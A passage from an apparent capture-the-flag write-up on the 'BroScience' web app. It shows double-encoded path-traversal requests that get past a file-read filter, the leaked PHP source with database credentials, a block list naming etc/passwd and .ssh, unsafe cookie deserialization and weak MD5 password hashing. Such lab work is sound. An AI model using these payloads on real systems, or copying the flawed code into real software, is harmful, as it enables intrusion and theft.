</span></span><span class=line><span class=cl>$db_name = &#34;broscience&#34;;
</span></span><span class=line><span class=cl>$db_user = &#34;dbuser&#34;;
</span></span><span class=line><span class=cl>$db_pass = &#34;RangeOfMotion%777&#34;;
</span></span><span class=line><span class=cl>$db_salt = &#34;NaCl&#34;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$db_conn = pg_connect(&#34;host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}&#34;);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if (!$db_conn) {
</span></span><span class=line><span class=cl>    die(&#34;&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database&#34;);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p><code>header.php</code> isn&rsquo;t particularly interesting, but for <code>GET /includes/img.php?path=..%252Fincludes%252Fimg.php HTTP/1.1</code> we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Date: Sat, 28 Jan 2023 09:01:58 GMT
</span></span><span class=line><span class=cl>Server: Apache/2.4.54 (Debian)
</span></span><span class=line><span class=cl>Content-Length: 483
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: image/png
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>if (!isset($_GET[&#39;path&#39;])) {
</span></span><span class=line><span class=cl>    die(&#39;&lt;b&gt;Error:&lt;/b&gt; Missing \&#39;path\&#39; parameter.&#39;);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Check for LFI attacks
</span></span><span class=line><span class=cl>$path = $_GET[&#39;path&#39;];
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$badwords = array(&#34;../&#34;, &#34;etc/passwd&#34;, &#34;.ssh&#34;);
</span></span><span class=line><span class=cl>foreach ($badwords as $badword) {
</span></span><span class=line><span class=cl>    if (strpos($path, $badword) !== false) {
</span></span><span class=line><span class=cl>        die(&#39;&lt;b&gt;Error:&lt;/b&gt; Attack detected.&#39;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Normalize path
</span></span><span class=line><span class=cl>$path = urldecode($path);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Return the image
</span></span><span class=line><span class=cl>header(&#39;Content-Type: image/png&#39;);
</span></span><span class=line><span class=cl>echo file_get_contents(&#39;/var/www/html/images/&#39; . $path);
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>So this is the filter we bypassed before to allow LFI.</p><p>For <code>GET /includes/img.php?path=..%252Fincludes%252Fnavbar.php HTTP/1.1</code> we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Date: Sat, 28 Jan 2023 09:02:56 GMT
</span></span><span class=line><span class=cl>Server: Apache/2.4.54 (Debian)
</span></span><span class=line><span class=cl>Content-Length: 1201
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: image/png
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>include_once &#34;includes/utils.php&#34;;
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;nav class=&#34;uk-navbar-container uk-margin uk-navbar-transparent &lt;?=get_theme_class()?&gt;&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;div class=&#34;uk-container uk-container-expand&#34;&gt;
</span></span><span class=line><span class=cl>        &lt;div class=&#34;uk-navbar&#34; uk-navbar&gt;
</span></span><span class=line><span class=cl>            &lt;div class=&#34;uk-navbar-left&#34;&gt;
</span></span><span class=line><span class=cl>                &lt;a href=&#34;/&#34; class=&#34;uk-navbar-item uk-logo&#34;&gt;BroScience&lt;/a&gt;
</span></span><span class=line><span class=cl>            &lt;/div&gt;
</span></span><span class=line><span class=cl>            &lt;div class=&#34;uk-navbar-right&#34;&gt;
</span></span><span class=line><span class=cl>                &lt;?php
</span></span><span class=line><span class=cl>                // Check if user is logged in
</span></span><span class=line><span class=cl>                if (isset($_SESSION[&#39;id&#39;])) {
</span></span><span class=line><span class=cl>                    echo &#39;&lt;div class=&#34;uk-navbar-item&#34;&gt;&lt;a href=&#34;swap_theme.php&#34; class=&#34;uk-link-text&#34;&gt;&lt;span uk-icon=&#34;icon: paint-bucket&#34;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;&#39;;
</span></span><span class=line><span class=cl>                    echo &#34;&lt;div class=\&#34;uk-navbar-item\&#34;&gt;Logged in as &lt;a class=\&#34;uk-link-text\&#34; href=\&#34;user.php?id={$_SESSION[&#39;id&#39;]}\&#34;&gt;&lt;b&gt;&#34;.htmlspecialchars($_SESSION[&#39;username&#39;],ENT_QUOTES,&#39;UTF-8&#39;).&#34;&lt;/b&gt;&lt;/a&gt;&lt;/div&gt;&#34;;
</span></span><span class=line><span class=cl>                    echo &#39;&lt;ul class=&#34;uk-navbar-nav&#34;&gt;&lt;li&gt;&lt;a href=&#34;logout.php&#34;&gt;Log Out&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&#39;;
</span></span><span class=line><span class=cl>                } else {
</span></span><span class=line><span class=cl>                    echo &#39;&lt;ul class=&#34;uk-navbar-nav&#34;&gt;&lt;li&gt;&lt;a href=&#34;login.php&#34;&gt;Log In&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&#39;;
</span></span><span class=line><span class=cl>                }
</span></span><span class=line><span class=cl>                ?&gt;
</span></span><span class=line><span class=cl>            &lt;/div&gt;
</span></span><span class=line><span class=cl>        &lt;/div&gt;
</span></span><span class=line><span class=cl>    &lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/nav&gt;
</span></span></code></pre></td></tr></table></div></div><p>And finally, <code>GET /includes/img.php?path=..%252Fincludes%252Futils.php HTTP/1.1</code> gives us:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Date: Sat, 28 Jan 2023 09:03:41 GMT
</span></span><span class=line><span class=cl>Server: Apache/2.4.54 (Debian)
</span></span><span class=line><span class=cl>Content-Length: 3060
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: image/png
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>function generate_activation_code() {
</span></span><span class=line><span class=cl>    $chars = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#34;;
</span></span><span class=line><span class=cl>    srand(time());
</span></span><span class=line><span class=cl>    $activation_code = &#34;&#34;;
</span></span><span class=line><span class=cl>    for ($i = 0; $i &lt; 32; $i++) {
</span></span><span class=line><span class=cl>        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    return $activation_code;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)
</span></span><span class=line><span class=cl>function rel_time($from, $to = null) {
</span></span><span class=line><span class=cl>    $to = (($to === null) ? (time()) : ($to));
</span></span><span class=line><span class=cl>    $to = ((is_int($to)) ? ($to) : (strtotime($to)));
</span></span><span class=line><span class=cl>    $from = ((is_int($from)) ? ($from) : (strtotime($from)));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $units = array
</span></span><span class=line><span class=cl>    (
</span></span><span class=line><span class=cl>        &#34;year&#34;   =&gt; 29030400, // seconds in a year   (12 months)
</span></span><span class=line><span class=cl>        &#34;month&#34;  =&gt; 2419200,  // seconds in a month  (4 weeks)
</span></span><span class=line><span class=cl>        &#34;week&#34;   =&gt; 604800,   // seconds in a week   (7 days)
</span></span><span class=line><span class=cl>        &#34;day&#34;    =&gt; 86400,    // seconds in a day    (24 hours)
</span></span><span class=line><span class=cl>        &#34;hour&#34;   =&gt; 3600,     // seconds in an hour  (60 minutes)
</span></span><span class=line><span class=cl>        &#34;minute&#34; =&gt; 60,       // seconds in a minute (60 seconds)
</span></span><span class=line><span class=cl>        &#34;second&#34; =&gt; 1         // 1 second
</span></span><span class=line><span class=cl>    );
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $diff = abs($from - $to);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if ($diff &lt; 1) {
</span></span><span class=line><span class=cl>        return &#34;Just now&#34;;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $suffix = (($from &gt; $to) ? (&#34;from now&#34;) : (&#34;ago&#34;));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $unitCount = 0;
</span></span><span class=line><span class=cl>    $output = &#34;&#34;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    foreach($units as $unit =&gt; $mult)
</span></span><span class=line><span class=cl>        if($diff &gt;= $mult &amp;&amp; $unitCount &lt; 1) {
</span></span><span class=line><span class=cl>            $unitCount += 1;
</span></span><span class=line><span class=cl>            // $and = (($mult != 1) ? (&#34;&#34;) : (&#34;and &#34;));
</span></span><span class=line><span class=cl>            $and = &#34;&#34;;
</span></span><span class=line><span class=cl>            $output .= &#34;, &#34;.$and.intval($diff / $mult).&#34; &#34;.$unit.((intval($diff / $mult) == 1) ? (&#34;&#34;) : (&#34;s&#34;));
</span></span><span class=line><span class=cl>            $diff -= intval($diff / $mult) * $mult;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $output .= &#34; &#34;.$suffix;
</span></span><span class=line><span class=cl>    $output = substr($output, strlen(&#34;, &#34;));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    return $output;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>class UserPrefs {
</span></span><span class=line><span class=cl>    public $theme;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    public function __construct($theme = &#34;light&#34;) {
</span></span><span class=line><span class=cl>		$this-&gt;theme = $theme;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function get_theme() {
</span></span><span class=line><span class=cl>    if (isset($_SESSION[&#39;id&#39;])) {
</span></span><span class=line><span class=cl>        if (!isset($_COOKIE[&#39;user-prefs&#39;])) {
</span></span><span class=line><span class=cl>            $up_cookie = base64_encode(serialize(new UserPrefs()));
</span></span><span class=line><span class=cl>            setcookie(&#39;user-prefs&#39;, $up_cookie);
</span></span><span class=line><span class=cl>        } else {
</span></span><span class=line><span class=cl>            $up_cookie = $_COOKIE[&#39;user-prefs&#39;];
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>        $up = unserialize(base64_decode($up_cookie));
</span></span><span class=line><span class=cl>        return $up-&gt;theme;
</span></span><span class=line><span class=cl>    } else {
</span></span><span class=line><span class=cl>        return &#34;light&#34;;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function get_theme_class($theme = null) {
</span></span><span class=line><span class=cl>    if (!isset($theme)) {
</span></span><span class=line><span class=cl>        $theme = get_theme();
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    if (strcmp($theme, &#34;light&#34;)) {
</span></span><span class=line><span class=cl>        return &#34;uk-light&#34;;
</span></span><span class=line><span class=cl>    } else {
</span></span><span class=line><span class=cl>        return &#34;uk-dark&#34;;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function set_theme($val) {
</span></span><span class=line><span class=cl>    if (isset($_SESSION[&#39;id&#39;])) {
</span></span><span class=line><span class=cl>        setcookie(&#39;user-prefs&#39;,base64_encode(serialize(new UserPrefs($val))));
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>class Avatar {
</span></span><span class=line><span class=cl>    public $imgPath;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    public function __construct($imgPath) {
</span></span><span class=line><span class=cl>        $this-&gt;imgPath = $imgPath;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    public function save($tmp) {
</span></span><span class=line><span class=cl>        $f = fopen($this-&gt;imgPath, &#34;w&#34;);
</span></span><span class=line><span class=cl>        fwrite($f, file_get_contents($tmp));
</span></span><span class=line><span class=cl>        fclose($f);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>class AvatarInterface {
</span></span><span class=line><span class=cl>    public $tmp;
</span></span><span class=line><span class=cl>    public $imgPath; 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    public function __wakeup() {
</span></span><span class=line><span class=cl>        $a = new Avatar($this-&gt;imgPath);
</span></span><span class=line><span class=cl>        $a-&gt;save($this-&gt;tmp);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>Continuing on, <code>GET /login.php</code> looks as follows:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Date: Sat, 28 Jan 2023 09:10:47 GMT
</span></span><span class=line><span class=cl>Server: Apache/2.4.54 (Debian)
</span></span><span class=line><span class=cl>Content-Length: 3028
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: image/png
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>session_start();
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Check if user is logged in already
</span></span><span class=line><span class=cl>if (isset($_SESSION[&#39;id&#39;])) {
</span></span><span class=line><span class=cl>    header(&#39;Location: /index.php&#39;);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Handle a submitted log in form
</span></span><span class=line><span class=cl>if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {
</span></span><span class=line><span class=cl>    // Check if variables are empty
</span></span><span class=line><span class=cl>    if (!empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {    
</span></span><span class=line><span class=cl>        include_once &#39;includes/db_connect.php&#39;;
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        // Check if username:password is correct
</span></span><span class=line><span class=cl>        $res = pg_prepare($db_conn, &#34;login_query&#34;, &#39;SELECT id, username, is_activated::int, is_admin::int FROM users WHERE username=$1 AND password=$2&#39;);
</span></span><span class=line><span class=cl>        $res = pg_execute($db_conn, &#34;login_query&#34;, array($_POST[&#39;username&#39;], md5($db_salt . $_POST[&#39;password&#39;])));
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        if (pg_num_rows($res) == 1) {
</span></span><span class=line><span class=cl>            // Check if account is activated
</span></span><span class=line><span class=cl>            $row = pg_fetch_row($res);
</span></span><span class=line><span class=cl>            if ((bool)$row[2]) {
</span></span><span class=line><span class=cl>                // User is logged in
</span></span><span class=line><span class=cl>                $_SESSION[&#39;id&#39;] = $row[0];
</span></span><span class=line><span class=cl>                $_SESSION[&#39;username&#39;] = $row[1];
</span></span><span class=line><span class=cl>                $_SESSION[&#39;is_admin&#39;] = $row[3];
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                // Redirect to home page
</span></span><span class=line><span class=cl>                header(&#39;Location: /index.php&#39;);
</span></span><span class=line><span class=cl>            } else {
</span></span><span class=line><span class=cl>                $alert = &#34;Account is not activated yet&#34;;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>        } else {
</span></span><span class=line><span class=cl>            $alert = &#34;Username or password is incorrect.&#34;;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    } else {
</span></span><span class=line><span class=cl>        $alert = &#34;Please fill in both username and password.&#34;;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>    &lt;head&gt;
</span></span><span class=line><span class=cl>        &lt;title&gt;BroScience : Log In&lt;/title&gt;
</span></span><span class=line><span class=cl>        &lt;?php include_once &#39;includes/header.php&#39;; ?&gt;
</span></span><span class=line><span class=cl>    &lt;/head&gt;
</span></span><span class=line><span class=cl>    &lt;body&gt;
</span></span><span class=line><span class=cl>        &lt;?php include_once &#39;includes/navbar.php&#39;; ?&gt;
</span></span><span class=line><span class=cl>        &lt;div class=&#34;uk-container uk-container-xsmall&#34;&gt;
</span></span><span class=line><span class=cl>            &lt;form class=&#34;uk-form-stacked&#34; method=&#34;POST&#34; action=&#34;login.php&#34;&gt;
</span></span><span class=line><span class=cl>                &lt;fieldset class=&#34;uk-fieldset&#34;&gt;
</span></span><span class=line><span class=cl>                    &lt;legend class=&#34;uk-legend&#34;&gt;Log In&lt;/legend&gt;
</span></span><span class=line><span class=cl>                    &lt;?php
</span></span><span class=line><span class=cl>                    // Display any alerts
</span></span><span class=line><span class=cl>                    if (isset($alert)) {
</span></span><span class=line><span class=cl>                    ?&gt;
</span></span><span class=line><span class=cl>                    &lt;div uk-alert class=&#34;uk-alert-&lt;?php if(isset($alert_type)){echo $alert_type;}else{echo &#39;danger&#39;;} ?&gt;&#34;&gt;
</span></span><span class=line><span class=cl>                            &lt;a class=&#34;uk-alert-close&#34; uk-close&gt;&lt;/a&gt;
</span></span><span class=line><span class=cl>                            &lt;?=$alert?&gt;
</span></span><span class=line><span class=cl>                        &lt;/div&gt;
</span></span><span class=line><span class=cl>                    &lt;?php
</span></span><span class=line><span class=cl>                    }
</span></span><span class=line><span class=cl>                    ?&gt;
</span></span><span class=line><span class=cl>                    &lt;div class=&#34;uk-margin&#34;&gt;
</span></span><span class=line><span class=cl>                        &lt;input name=&#34;username&#34; class=&#34;uk-input&#34; placeholder=&#34;Username&#34;&gt;
</span></span><span class=line><span class=cl>                    &lt;/div&gt;
</span></span><span class=line><span class=cl>                    &lt;div class=&#34;uk-margin&#34;&gt;
</span></span><span class=line><span class=cl>                        &lt;input name=&#34;password&#34; class=&#34;uk-input&#34; type=&#34;password&#34; placeholder=&#34;Password&#34;&gt;
</span></span><span class=line><span class=cl>                    &lt;/div&gt;
</span></span><span class=line><span class=cl>                    &lt;div class=&#34;uk-margin&#34;&gt;
</span></span><span class=line><span class=cl>                        &lt;button class=&#34;uk-button uk-button-default&#34; type=&#34;submit&#34;&gt;Log in&lt;/button&gt;
</span></span><span class=line><span class=cl>                    &lt;/div&gt;
</span></span><span class=line><span class=cl>                    &lt;div class=&#34;uk-margin&#34;&gt;
</span></span><span class=line><span class=cl>                        &lt;a href=&#34;register.php&#34;&gt;Create an account&lt;/a&gt;
</span></span><span class=line><span class=cl>                    &lt;/div&gt;
</span></span><span class=line><span class=cl>                &lt;/fieldset&gt;
</span></span><span class=line><span class=cl>            &lt;/form&gt;
</span></span><span class=line><span class=cl>        &lt;/div&gt;
</span></span><span class=line><span class=cl>    &lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p>And <code>GET /register.php</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
